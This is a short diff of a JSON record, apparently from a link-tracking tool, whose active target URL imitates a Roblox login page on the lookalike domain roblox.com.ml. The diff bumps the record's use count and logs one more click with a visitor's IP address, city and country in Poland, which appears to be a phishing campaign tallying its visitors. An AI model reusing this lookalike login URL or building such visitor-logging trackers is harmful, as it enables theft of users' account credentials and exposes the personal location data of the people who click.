@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 180,
+    "useCount": 181,
     "createdBy": "admin",
     "clicks": [
       {
@@ -1552,6 +1552,14 @@
         "city": "Fameck",
         "flag": "🇫🇷",
         "countryCode": "FR"
+      },
+      {
+        "timestamp": 1776963507597,
+        "ip": "85.221.134.42",
+        "country": "Poland",
+        "city": "Poznan",
+        "flag": "🇵🇱",
+        "countryCode": "PL"
       }
     ]
   },
